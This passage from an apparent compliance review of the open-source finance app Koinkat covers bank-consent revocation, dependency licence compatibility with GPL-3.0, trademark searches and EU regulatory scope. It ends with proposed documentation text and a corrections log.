   transaction descriptions to a hosted model, the project would begin
   determining a means of processing personal data, and the whole analysis
   in this section would need redoing. Flagged forward.

### Q6: Revocation

**In-app disconnect does call revocation, but fails silently.**
`disconnectBank` calls `ebService.deleteSession(conn.session_id)`, which
issues `DELETE /sessions/{id}`
(`src/services/enable-banking-service-real.ts:426`). However at
`src/services/bank-sync-service.ts:1372-1376` the call is wrapped in
`try { ... } catch { /* session may already be expired */ }`. The comment
describes the benign case, but the `catch` swallows **every** failure -
network error, auth failure, server error - and the function then unlinks
locally regardless. A user who disconnects while offline is shown success and
may still have a live consent at their bank.

This is both a documentation accuracy issue and a small code defect. The fix
is to distinguish "already gone" from "could not reach EB" and tell the user
in the latter case.

**Independent revocation is under-documented.** Enable Banking's FAQ states
that end users "can also review and terminate their active data sharing
consents" at <https://enablebanking.com/data-sharing-consents/>
(<https://enablebanking.com/docs/faq/>). Koinkat mentions revocation once, in
passing, at `docs/privacy-policy.md:84` - "can be revoked earlier through
your bank or through Enable Banking" - **without a URL**. The README's
"Consent expiry" section (`README.md:836-844`) covers expiry and relinking
but never mentions revocation at all.

Both the EB consents URL and a pointer to the bank's own consent dashboard
belong in the user guide. This is a straightforward, high-value addition.

For completeness: EB's documented maximum consent lifetime is set by the
client via `valid_until` on `POST /auth`, with 180 days the usual ceiling
(<https://enablebanking.com/docs/faq/>). Koinkat requests 179 days
(`src/lib/constants.ts:24`), which sits just inside it.

### Q7: Licence compatibility with GPL-3.0

Nothing in Enable Banking's terms was found that conflicts with
redistributing Koinkat under GPL-3.0-or-later. The terms restrict use of
**the Control Panel and the API**; they do not purport to license, restrict
or condition the copyright in software that a user writes or runs against the
API, and they contain no field-of-use or share-alike condition that could
attach to Koinkat's own source.

The intellectual-property clause reserves EB's rights in "the Control Panel,
API, documentation, and associated materials" (<https://enablebanking.com/terms/>).
Koinkat vendors none of these: it ships its own client implementation
(`src/services/enable-banking-service-real.ts`), not EB's SDK.

`NEEDS-HUMAN-CHECK`: whether Koinkat's in-app setup guide - which paraphrases
EB's documentation extensively across ten steps in
`src/components/BankSetupGuide.tsx` - reproduces enough of EB's
"documentation" to implicate that clause. The guide appears to be
independently written prose describing a workflow rather than copied text,
but this was not compared line by line against EB's docs.

---

## Task 3 - Licence and dependency hygiene

### Tooling used, and the coverage gap

**No SBOM tool was used.** `syft`, `grant`, `grype`, `license-checker`,
`cargo-license` and `cargo-deny` are not installed on the review machine, and
nothing was installed. Licence data was read directly from package metadata:

- **npm:** every `package.json` under `node_modules/`, reconciled against
  `package-lock.json`.
- **Rust:** all 617 entries in `src-tauri/Cargo.lock`, resolved against the
  local cargo registry cache.

**No vulnerability scan of any kind was performed.** There is no CVE data in
this review. That is a gap, not an all-clear.

**A second, subtler gap:** of 617 crates in `Cargo.lock`, licences resolved
for **408**. The other 209 are absent from the local cache because cargo only
downloads crates needed for the current target - these are the macOS, Linux
and Android dependencies (`atk`, `cairo-rs`, `core-foundation`, `dbus`,
`webkit2gtk` and similar), plus a few transitively unused ones. They are not
unlicensed; they were simply not fetched on a Windows machine. **The Rust
licence review below therefore covers the Windows build only.** Closing it
means running the check on each target platform, or using a tool that reads
the crates.io index rather than the local cache.

### npm dependencies - 174 packages, all permissive

| Licence | Count |
|---|---|
| MIT | 131 |
| ISC | 20 |
| MIT OR Apache-2.0 | 6 |
| Apache-2.0 | 4 |
| BSD-3-Clause | 3 |
| OFL-1.1 | 3 |
| Apache-2.0 OR MIT | 3 |
| MPL-2.0 | 2 |
| CC-BY-4.0 | 1 |
| MIT AND ISC | 1 |

**No package lacks a licence field. No `UNKNOWN`. No proprietary licence. No
copyleft conflict with GPL-3.0-or-later outbound.**

Non-default licences, identified and assessed:

- **OFL-1.1** - `@fontsource/dm-sans`, `@fontsource/dm-serif-display`,
  `@fontsource/jetbrains-mono`. These are the **only third-party assets
  compiled into the shipped binary** among this group. See the notice gap
  below.
- **MPL-2.0** - `lightningcss`, `lightningcss-win32-x64-msvc`. Build-time
  only (Tailwind's CSS toolchain). `UNVERIFIED`: MPL-2.0 is generally
  understood to permit distribution of a larger work under the GPL via its
  secondary-licence mechanism, but this was not verified against the MPL
  text here.
- **CC-BY-4.0** - `caniuse-lite`. Build-time browser-targeting data.
- **BSD-3-Clause** - `d3-ease`, `react-transition-group`, `source-map-js`.
  The first two ship (Recharts transitive dependencies).
- **Apache-2.0** - `typescript`, `expect-type`, `detect-libc`,
  `baseline-browser-mapping`. Build-time only.

### Rust dependencies - 408 of 617 resolved, all permissive

| Licence | Count |
|---|---|
| MIT OR Apache-2.0 (all spellings) | 265 |
| MIT | 84 |
| Unicode-3.0 | 18 |
| MPL-2.0 | 5 |
| Unlicense OR MIT (both spellings) | 6 |
| BSD-3-Clause (incl. combinations) | 6 |
| Apache-2.0 only | 3 |
| Zlib / ISC / BSL-1.0 / 0BSD / CC0-1.0 / MIT-0 / BSD-2-Clause combinations | 20 |
| CDLA-Permissive-2.0 | 1 |

**Nothing GPL-incompatible was found in the resolved set.** The two that
could have forced a change - Apache-2.0 and MPL-2.0 - were checked against
the FSF's stated positions on 2026-08-27 and are compatible. Note on
sourcing: `gnu.org` refused connections from the review machine, so those
positions were read from FSF-domain search results rather than from the
licence list page directly. The conclusions are the FSF's; the retrieval
route was second-hand.

Items worth naming:

- **Apache-2.0 with no MIT alternative** - `tao 0.35.3` (Tauri's windowing
  layer), `sync_wrapper 1.0.2`, `borsh-derive 1.7.0`. **Checked 2026-08-27
  against the FSF's position:** Apache-2.0's patent clauses are incompatible
  with GPLv2, and GPLv3 was written to be compatible with them. Since the
  outbound licence is GPL-3.0-**or-later**, this is fine - but it means
  **GPLv3 is an effective floor**. Nobody could redistribute the combined
  work under GPLv2, whatever the "or later" text might otherwise suggest.
  Worth knowing before any future relicensing conversation.
- **MPL-2.0** - `cssparser`, `cssparser-macros`, `selectors`, `dtoa-short`,
  `option-ext`, plus `lightningcss` on the npm side. **Checked 2026-08-27:**
  the FSF's position is that MPL 2.0 section 3.3 provides compatibility with
  the GNU GPL v2 and later, so this is settled rather than assumed.
- **CDLA-Permissive-2.0** - `webpki-roots 1.0.8`, the bundled CA root
  store. This is a data licence rather than a code licence. Still
  `UNVERIFIED`: the FSF licence list does not address CDLA-Permissive-2.0
  at all, so there is no opinion to cite either way. Risk appears low
  (permissive terms, no copyleft, data not code), but it remains the single
  least-standard licence in the tree. Open question 7.
- **Unicode-3.0** - the 18 ICU crates. Permissive.

### The third-party licence notice gap

**No `NOTICE`, `THIRD-PARTY-LICENSES`, or equivalent file exists** anywhere
in the repository or the packaging directory. Verified by searching the tree
excluding `node_modules/` and build output.

This matters because MIT, BSD-2/3-Clause, Apache-2.0 and OFL-1.1 all condition
redistribution on retaining copyright and licence notices, and Koinkat
**distributes compiled binaries** through GitHub Releases and winget. The
sharpest case is the fonts: `@fontsource` ships an OFL-1.1 `LICENSE` file in
each package, the `.woff2` binaries are compiled into the app
(`dist/assets/dm-sans-*.woff2` → Tauri binary), and no OFL text travels with
them.

`UNVERIFIED`: the specific notice-retention requirements of OFL-1.1, MIT,
BSD and Apache-2.0 are stated here from general knowledge and were not
verified against the licence texts. That verification is cheap and worth
doing before the next release.

Practical remedy: generate a `THIRD-PARTY-LICENSES.md` at build time and
include it in the bundle. This is a solved problem with existing tooling and
is a small task.

### Metadata consistency

| Location | Licence | Author | Status |
|---|---|---|---|
| `package.json:10` | `GPL-3.0-or-later` | - | Correct |
| `LICENSE` | GPL-3.0 full text | - | Correct |
| `README.md:1056-1064` | GPL-3.0-or-later, "Copyright (C) 2026 Marco Sburlino" | Marco Sburlino | Correct |
| `src-tauri/tauri.conf.json` | - | `copyright`, `publisher`, `homepage` all populated | Correct |
| **`src-tauri/Cargo.toml`** | **absent** | **absent** | **Gap** - no `license`, `authors`, `description` or `repository` field |

No placeholder strings (`TODO_*`, dummy URLs, fake signing identities) were
found in any of these files.

The `Cargo.toml` gap is cosmetic today because the crate is not published to
crates.io, but it is the one file where a reader looking for the licence
finds nothing.

### Copied code and attribution

Two external-provenance items were found, both already attributed:

1. **`src/data/mcc-mappings.ts:8`** - attributes the MCC list to
   `github.com/greggles/mcc-codes`, described as "public domain". Verified:
   that repository is released under the **Unlicense**
   (<https://github.com/greggles/mcc-codes>), which is a public-domain
   dedication and is GPL-compatible. The attribution is substantively
   correct; naming the Unlicense explicitly would be more precise.

2. **`src/domain/currencies.ts:1`** - cites
   `Koinkat Demo/app/models/exchange_rate.py` as the source of the ISO 4217
   list. That is the maintainer's own earlier project (`KoinkatDemo/` is
   gitignored), so there is no third-party rights question. But it is a
   dangling reference in a public file pointing at a path no reader can
   reach. Worth rewording. (ISO 4217 code and name lists are widely
   reproduced; `UNVERIFIED` whether ISO asserts rights over the list itself.)

No other long unusual algorithms, distinctive comment blocks, or vendored
snippets without attribution were identified. Given that much of this
codebase was written with AI assistance, note the limit of this check: it
finds *unattributed copying that looks like copying*. It cannot rule out
short idiomatic fragments reproduced from training data, and no automated
similarity scan against public corpora was run.

### Contributions - the inbound licence gap

**`CONTRIBUTING.md` contains no inbound licence clause.** Searching for
"licen", "copyright", "inbound", "DCO", "sign-off" and "CLA" returns nothing.
The file covers setup, invariants, PR process, bug reporting and the release
process, and stops there.

With open PRs, this means contributions are being accepted with no explicit
statement of the terms on which they are offered. GitHub's own terms provide
a default for public repositories, but relying on that implicitly is weaker
than a one-line statement. Draft clause in [Task 4](#task-4---proposed-text).

### Secrets in git history

**Clean.** Verified:

- No `.pem`, `.key`, `.p8`, `.env*`, or `.db` file was ever added in any
  commit on any branch (`git log --all --diff-filter=A`). The only match for
  a "secret" pattern is `src-tauri/src/secrets.rs`, which is source code.
- No tracked file matches `.agent/`, `.claude/`, `junk/`, `personal/`,
  `AGENTS.md`, `*.pem`, `*.key`, or `.env`.
- `.agent/`, `.claude/`, `junk/` and `.git-old-history-backup/` are all
  gitignored (`.gitignore:89,96,98,103`) and untracked. Working tree clean.
- 49 commits, single remote (`github.com/MarcoSburlino/Koinkat`).

No application IDs, tokens or IBANs were found in tracked content. The mock
fixtures (`src/mocks/eb_mock_fixtures.json`) contain synthetic merchant data.

---

## Task 5 - Trademark and naming

### Registry searches

**TMview** (EUIPO-operated, covering EUIPO plus EU national offices and many
international offices), searched 2026-08-26 for marks *containing* "koinkat":

**10 results, all from the Japan Patent Office, none an exact match.** The
hits are phonetic and transliteration near-misses: `COINCARD`,
`コインカード`, `Coin Cart`, `§Coin Cart`, `§K∞KOYIN CUT`,
`なでしこインカット`, `ONE COIN GUARD`, `コイン型おしぼり`. Statuses are
mixed (4 registered, 4 expired, 2 terminated). Two are in class 9, held by
Asahi Seiko for coin-handling hardware.

**No EUIPO result. No EU national office result. No exact "Koinkat" anywhere
in TMview.**

That is the finding that matters: as far as TMview shows, the mark is not
registered in the EU in any class, and Japanese registrations for different
words have no effect in the EU.

**WIPO Global Brand Database**, searched 2026-08-27 for a brand name
containing "koinkat", across 76,490,305 records from 89 data sources:
**"No results found!"** This closes the gap the first pass left open.

Caveats, stated plainly:
- Neither TMview nor the Global Brand Database is an official register;
  TMview's own disclaimer says its contents have no legal effect.
- Both were "contains" searches on the word mark. No figurative search, no
  phonetic-similarity search in EU offices, and no class-9 or class-36
  similarity analysis was run. A registrability clearance is a different and
  more expensive exercise.
- EUIPO eSearch was not driven separately, but EUIPO's register is covered
  by both tools searched.

### Common-law and web presence

Two adjacent names in the sector, neither an exact match, neither found as a
registered mark:

1. **"Koink"** - an iOS app described as an AI-powered money journal, on the
   App Store (<https://apps.apple.com/us/app/koink/id6759999016>). **This is
   the closest signal**: near-identical name stem, same sector (personal
   finance), same channel (consumer app stores). Prior unregistered use in
   the same field is the classic source of a dispute even without a
   registration.
2. **"KoinKart"** - a Web3/blockchain development company
   (<https://www.koinkart.org/>). Adjacent sector, more distant name.

Neither appears in TMview, so both are presumably unregistered common-law
use. Neither is a bar to using "Koinkat"; both are facts a lawyer would want
before advising on a registration.

### Assessment

No collision was found that blocks continued use. The considerations that
remain are commercial rather than defensive: the "Koin-" stem is crowded in
fintech, which makes a registration harder to obtain and narrower once
obtained. `UNVERIFIED` - no view is offered here on registrability, which is
a question for a trademark attorney.

The brief's observation that this gets more expensive to fix the longer it
waits is correct in general and is not contradicted by anything found here.

---

## Scope exclusions

Each of the following was checked rather than assumed, and each is out of
scope for the stated reason.

**EU AI Act, Article 50 transparency - out of scope, verified.**
The app contains no LLM, no model inference, and no AI-generated output
reaching users. Searching `src/`, `package.json` and `Cargo.toml` for
`openai`, `anthropic`, `llm`, `gpt-`, `gemini`, `huggingface`,
`transformers`, `onnx`, `tensorflow`, `inference` and `embedding` returns
only: two merchant-name patterns that categorise OpenAI and Anthropic
*subscriptions* as expenses (`src/db/seed.ts:273-274`), mock fixture data,
and a placeholder comment for an LLM stage that does not exist
(`src/services/categorization-service.ts:178-182`). The "learning" rule
engine is deterministic - exact-match rules with a stored confidence column
(`src/services/categorization-service.ts:76-85`), not machine learning.
**Forward flag:** implementing that LLM stage would bring AI Act
considerations, a new outbound host, a CSP change and a privacy-policy change
into scope simultaneously.

**Cookie and consent management - out of scope, verified.**
There is no website beyond the static callback page. That page was read in
full: it uses no cookies, no `localStorage`, no `sessionStorage`, and loads
no external resources. The app itself is a desktop webview with no cookie
consent surface.

**Merchant-of-record, EU VAT, consumer distance-selling - out of scope.**
Nothing is sold. No payment is accepted anywhere in the project.

**SOC 2 / ISO 27001 - out of scope.** No enterprise customers, no service,
no infrastructure to certify.

**Cyber Resilience Act - in scope, and time-sensitive.**
Regulation (EU) 2024/2847 entered into force on 10 December 2024. Its
**reporting obligations apply from 11 September 2026** - roughly two weeks
after the date of this review - with the remaining obligations from
11 December 2027 (<https://digital-strategy.ec.europa.eu/en/policies/cra-summary>).

The Regulation carves out non-commercial free and open-source software.
Recital 18 states that supply of products qualifying as free and open-source
software "that are not monetised by their manufacturers" should not be
considered a commercial activity
(<https://eur-lex.europa.eu/legal-content/EN/TXT/HTML/?uri=OJ:L_202402847>).

On the facts verified in this review - no revenue, no paid tier, no
commercial service - Koinkat appears to sit inside that carve-out today.

**What would change that.** Monetisation is the hinge, and the operative
language is in **Recital 15**, not Recital 18. Recital 15 lists what can make
a supply commercial: charging a price, charging for technical support beyond
cost recovery, an intention to monetise, requiring personal-data processing
as a condition of use, or "accepting donations exceeding the costs
associated with the design, development and provision"
(<https://eur-lex.europa.eu/legal-content/EN/TXT/HTML/?uri=OJ:L_202402847>).

**On donations specifically, the same recital answers the question directly:
"Accepting donations without the intention of making a profit"** should not
be considered a commercial activity (same source). So a plain donation
channel is not by itself disqualifying. The line is drawn at donations that
exceed development costs, or that come with a profit intention.

Recital 18 adds that "the mere circumstances under which the product ... has
been developed, or how the development has been financed" are not to be
taken into account (same source), so grant or sponsor funding of the work
does not by itself make the supply commercial.

In rough order of how likely each is to forfeit the carve-out:

1. A paid tier, paid support beyond cost recovery, or any charge for the
   software - squarely within Recital 15's list.
2. Donor-only builds, early access, or releases and security updates
   supplied only to people who paid - these convert a donation into a price.
3. A plain Sponsors or Open Collective link with no strings - **on Recital
   15's wording this does not forfeit the carve-out**, which reverses this
   review's earlier reading.

`UNVERIFIED`: recitals are interpretive aids, not operative provisions, and
the corresponding article text was not traced in this review. The
Commission's Article 26 guidance is the next place to look. Open question 2
carries the residual.

---

## Task 4 - Proposed text

All of the following are **proposals**. Nothing in this section has been
applied to the repository.

### 4.1 README - No warranty / not financial advice

Insert under `## License`, after the existing copyright line:

```markdown
### No warranty, and not financial advice

Koinkat is provided as-is. Sections 15 and 16 of the GPL-3.0 disclaim all
warranty and limit liability - please read them; they are short and they
mean what they say.

Two things follow that are worth stating plainly:

- **Check your own numbers.** Koinkat reads data from your bank through a
  third party and does arithmetic on it. Bugs, failed syncs, stale exchange
  rates and bank-side quirks are all possible. Your bank's own statements
  are the authoritative record, not this app.
- **Nothing here is financial advice.** Koinkat shows you your money. It
  does not advise you about it, and no output of this app is a
  recommendation to do anything.
```

### 4.2 CONTRIBUTING.md - inbound licence clause

Insert as a new section before `## Release process (maintainer)`:

```markdown
## Licensing of contributions

Koinkat is licensed under GPL-3.0-or-later. By submitting a pull request,
you agree that your contribution is licensed inbound under the same terms -
GPL-3.0-or-later - and that you have the right to license it that way.

If your contribution includes code you did not write, say so in the PR and
name its licence. Anything that cannot be distributed under
GPL-3.0-or-later cannot be merged.
```

### 4.3 README - the outbound connections paragraph (claims #4 and #10)

Replace the paragraph at `README.md:69-73`:

```markdown
Like every internet request, these servers see your IP address. Beyond the
list above the app contacts nothing: there are no update pings, no crash
reporting and no tracking - there is no telemetry endpoint to disable
because none was ever built.

Two independent controls keep the app's own traffic to the hosts above: the
webview's content-security policy, and the Tauri capability allowlist, which
scopes the Rust HTTP client to the same three hosts. Neither control applies
to the Rust dependency tree itself - as in any native application, a
compromised crate could open a socket directly. That is the trust you extend
to the dependency set of any desktop app you run; `Cargo.lock` and
`package-lock.json` are in this repository so the set can be audited.

Separately, Koinkat can ask your operating system to open a link in your
normal browser: your bank's authorization page, Enable Banking's control
panel, and the "report an issue" link on the crash screen. Those are ordinary
browser visits, subject to whatever those sites do.
```

Also change the table's introduction at `README.md:56-58` from "Here is the
complete list of outbound connections the app makes" to "Here is every
connection the app itself makes".

### 4.4 README - the callback row (claim #7)

Extend the third table row's "What is not sent" cell with:

```markdown
It is served from GitHub Pages, so GitHub records the request URL -
including the authorization code - the same way it records a request for any
page it hosts. GitHub's own documentation says a visitor's IP address is
logged and stored for security purposes; it provides no request logs to the
owner of a Pages site, so nobody on this project can read them. The code
itself is single-use, expires quickly, and cannot be exchanged for anything
without the private key that never leaves your machine. If you would rather
not rely on any of that, host your own copy of the page and put its URL in
the Redirect URL field.
```

### 4.5 README - headline (claim #1)

At `README.md:5-7`, "All data stays on your device" is contradicted by the
app's own table. Suggested: "Your data lives on your device - no cloud sync,
no telemetry, no accounts system. The only data that leaves is what your bank
sends you, when you ask it to."

### 4.6 Privacy policy (claim #20)

At `docs/privacy-policy.md:64`, replace "There are no other outbound
connections." with "The app makes no other outbound connections of its own.
It can also ask your browser to open your bank's site, Enable Banking's
control panel, or this project's issue tracker."

### 4.7 Revocation guidance (Q6)

Add to the README's "Consent expiry" section, and to
`docs/privacy-policy.md:83-84`:

```markdown
You can revoke a bank consent at any time without waiting for it to expire,
in three places: disconnect the bank inside Koinkat, terminate the consent
at <https://enablebanking.com/data-sharing-consents/>, or withdraw it from
your bank's own consent or third-party-access dashboard. Revoking at your
bank is the one that always works, because it does not depend on any other
service being reachable.
```

And fix the underlying defect at `src/services/bank-sync-service.ts:1372-1376`
so a failed revocation is surfaced rather than swallowed.

### 4.8 SECURITY.md - is it realistic?

Current promises: initial response within 7 days; up to 90 days before public
disclosure.

**Assessment: keep the 7 days, and soften how it is phrased.** For a solo
unpaid maintainer, 7 days is not obviously unmeetable - but it is stated as
"You should get an initial response within 7 days", which reads as a
commitment and takes no account of holidays or illness. 90 days for
coordinated disclosure is the industry norm and is a request to the reporter,
not a promise by the maintainer, so it carries no risk.

Suggested edit to `SECURITY.md:9-10`:

```markdown
Include what you can: affected version or commit, reproduction steps, and
impact. Koinkat is maintained by one person in their spare time - I aim to
acknowledge reports within 7 days, and I will tell you if a fix is going to
take longer than that.
```

### 4.9 CODE_OF_CONDUCT.md - contact address

`CODE_OF_CONDUCT.md:56` directs reports to
"[@MarcoSburlino](https://github.com/MarcoSburlino)" - a GitHub profile, not
an email address.

**This is a judgement call, not a defect.** A GitHub profile is a reachable
contact and supports private outreach. The Contributor Covenant's own text
anticipates a specific contact method, and someone reporting conduct *by the
maintainer* has nowhere else to go - but publishing a personal email address
has a real privacy cost for a solo individual, and the alternative of
creating a project-specific address is extra work for a project that may
never need it.

Options, in order of cost: leave as-is; add a project-specific email alias;
add a note that reports about the maintainer can go to GitHub Support.

### 4.10 The stale callback file

Either replace `docs/callback/index.html` with the current deployed source
from the `koinkat-callback` repository, or delete it and replace it with a
short `README.md` in that directory pointing to the canonical repository.
The second is less likely to drift again.

### 4.11 Third-party licence notice

Generate a `THIRD-PARTY-LICENSES.md` covering the shipped npm and Rust
dependencies - the OFL-1.1 fonts in particular - and include it in the
bundle. See [Task 3](#the-third-party-licence-notice-gap).

### 4.12 Cargo.toml metadata

Add to `[package]` in `src-tauri/Cargo.toml`:

```toml
license = "GPL-3.0-or-later"
authors = ["Marco Sburlino"]
description = "Local-first multi-currency personal finance manager"
repository = "https://github.com/MarcoSburlino/Koinkat"
```

---

## Appendix - what was searched

For reproducibility, and so that a later reviewer can tell verified negatives
from unexamined ground.

| Question | Method |
|---|---|
| Outbound network paths | `grep` for `fetch(`, `@tauri-apps/plugin-http`, `plugin-shell`, and all `https?://` literals across `src/`; CSP in both `tauri.conf.json` files; capability scopes in `src-tauri/capabilities/`; network-capable crates in `Cargo.lock`; external hosts in the compiled `dist/` bundle |
| Telemetry | 16 SDK names across `package.json` and `package-lock.json`; updater keys in both Tauri configs; `tauri-plugin-updater` and `self_update` in `Cargo.toml` and `Cargo.lock` |
| Fonts | `package.json` dependencies, `src/main.tsx` imports, CSP `font-src`, compiled `dist/assets/*.woff2`, and a `googleapis`/`gstatic` grep of the whole bundle |
| Shell open scope | `tauri-plugin-shell-2.3.5` crate source in the local cargo registry: `src/lib.rs`, `src/config.rs`, `src/scope.rs` |
| AIS-only scope | `startAuthorization` body in `enable-banking-service-real.ts`; grep of all of `src/` for payment-initiation surfaces |
| Revocation | `deleteSession` call sites; `disconnectBank` in `bank-sync-service.ts` |
| Callback page | The committed `docs/callback/index.html`, plus the deployed page and its raw source from the `koinkat-callback` repository |
| EB terms and docs | Terms of Service, End User terms, Privacy Notice, Control Panel docs, linked-accounts docs and FAQ, all fetched 2026-08-26 without login |
| npm licences | `license` field of every `package.json` under `node_modules/` |
| Rust licences | All 617 `Cargo.lock` entries against the local cargo registry cache (408 resolved) |
| Secrets in history | `git log --all --diff-filter=A --name-only` filtered for key, env and database extensions; `git ls-files` against the private-path patterns |
| AI / LLM | 12 provider and framework names across `src/`, `package.json`, `Cargo.toml` |
| Trademark | TMview "contains" search for the word mark; general web search |

---

## Corrections (2026-08-27)

Recorded here rather than silently edited, because an evidence base that
changes without saying so is worth less than one that does.

1. **CRA donations: Recital 15, not Recital 18.** The Scope exclusions
   section attributed the donations and monetisation rule to Recital 18 and
   left the donations treatment as `NEEDS-HUMAN-CHECK`. The Recital 18 quote
   used - "not monetised by their manufacturers" - is genuine, but the
   donations rule is Recital 15, and it answers the question outright:
   donations without profit intent are not a commercial activity. The
   section now cites Recital 15 and states the answer. The earlier advice to
   add no funding channel until this was resolved is withdrawn.

2. **The maintainer holds no log of authorization codes.** Section 1.5 and
   Task 2 Q5 implied that GitHub Pages request logs might be retained by, or
   available to, the maintainer. GitHub exposes no request logs to Pages
   site owners in any form. Both sections now say so. This was the strongest
   argument against the project's privacy position and it is weaker than the
   review originally presented it.

3. **Open-question cross-references renumbered** to match
   [`legal-open-questions.md`](legal-open-questions.md), which they did not
   before.

Both substantive corrections pointed in the more alarming direction.

